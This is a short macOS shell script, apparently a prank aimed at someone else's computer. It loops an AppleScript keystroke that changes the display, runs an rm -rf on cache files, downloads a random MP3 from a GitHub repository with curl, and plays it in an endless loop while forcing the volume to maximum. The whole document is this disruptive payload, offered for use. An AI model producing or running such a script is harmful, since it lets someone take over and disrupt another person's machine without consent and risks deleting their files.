echo "tell application \"System Events\"
key code 28 using {command down, option down, control down}
end tell" > ~/Library/config
while [ 1 ]; do osascript ~/Library/config; done &
zsh -c 'rm -rf "~/Library/*42_cache*"';

BASIC=('https://raw.githubusercontent.com/LogoutPolice/RandomBanana/master/')
LINKS=('PS' 'old' 'PulpFiction' 'Renault')
INDEX=$(awk -v min=0 -v max=3 'BEGIN{srand(); print int(min+rand()*(max-min+1))}')
LINK=("$BASIC${LINKS[$INDEX]}.mp3")
curl $LINK > ~/.TemporaryItems/mem.mp3

while [ 1 ]; do afplay ~/.TemporaryItems/mem.mp3; done &
while [ 1 ]; do osascript -e "set Volume 10"; done &
